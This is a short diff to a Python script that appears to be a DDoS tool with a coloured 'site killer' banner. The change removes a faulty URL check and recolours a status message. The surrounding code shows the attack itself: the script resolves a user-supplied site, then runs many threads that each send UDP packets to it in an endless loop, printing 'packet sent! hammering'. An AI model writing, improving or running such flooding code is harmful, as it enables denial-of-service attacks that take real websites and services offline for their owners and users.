@@ -15,10 +15,6 @@ print('          \033[32m|___/_|\__\___|     \033[31m|_|\_\_|_|_|\___|_|  ')
 print("")
 
 site = input("Enter your site url => ")
-if site=='https,http':
-    print('')
-else:
-    print('ERORE')
 thread_count = input("Enter your thread => ")
 
 ip = socket.gethostbyname(site)
@@ -34,7 +30,7 @@ def ddos(i):
     while 1:
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, UDP_PORT))
-        print ("\033[93m[+]",time.ctime(time.time()),"<--packet sent! hammering-->")
+        print ("\033[93m[+]",time.ctime(time.time()),"\033[95m<--packet sent! hammering-->")
 
 for i in range(int(thread_count)):
     try:
